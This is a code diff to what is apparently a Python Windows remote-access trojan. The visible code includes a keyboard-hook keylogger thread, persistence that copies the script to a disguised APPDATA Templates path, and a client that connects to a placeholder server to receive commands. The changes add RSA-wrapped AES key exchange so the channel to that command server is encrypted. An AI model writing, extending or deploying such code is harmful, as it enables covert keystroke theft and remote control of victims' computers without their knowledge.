@@ -12,8 +12,9 @@ from pythoncom import PumpMessages
 from pyWinhook import HookManager
 from threading import Thread
 from ctypes import windll
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util import Counter
+from Crypto.PublicKey import RSA 
 
 class Keylogger(Thread):
     ''' Thread for incommig dns requests '''
@@ -56,7 +57,7 @@ class Client:
         self.SERVER_IP = '<SERVER-IP-ADDRESS>'
         self.SERVER_PORT = 8080
         self.USERNAME = self.get_username()
-        self.key = b';6\xbd\x87\x91\x04\x8e%\xca\xf2s\x7f\x13\xaa\xe6a\xc3\x13\xe0\t\x060\xe1U\xbe\xf2\x9e\xf6\x18\xdc\x9b8'
+        self.key = os.urandom(32)   # generate random 32 bytes key
         # Persistence I: copy script to random appdata location
         self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
         self.PATH = os.path.realpath(__file__)
@@ -79,6 +80,15 @@ class Client:
         ''' Encrypt/Decrypt function '''
         return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
     
+    def get_aes_key(self, KEY):
+        ''' Decrypt using RSA private key '''
+        # read pem file or embed key to script
+        privatekey = open('src/private.pem', 'r').read()
+        decryptor = RSA.importKey(privatekey)
+        cipher = PKCS1_OAEP.new(decryptor)
+        AES_Key = cipher.decrypt(KEY) 
+        return AES_Key
+
     def encrypt(self, message):
         ''' AES encrypt algorithm using CTR mode, takes bytes variable '''
         iv = os.urandom(16)
@@ -141,6 +151,8 @@ class Client:
         ''' connect to server '''
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
         s.connect((self.SERVER_IP, self.SERVER_PORT)) # Here we define the server IP and the listening port
+        # get key
+        self.key = self.get_aes_key(s.recv(1024))
         # send username
         s.send(self.encrypt(self.USERNAME.encode()))
         # keep receiving commands from server
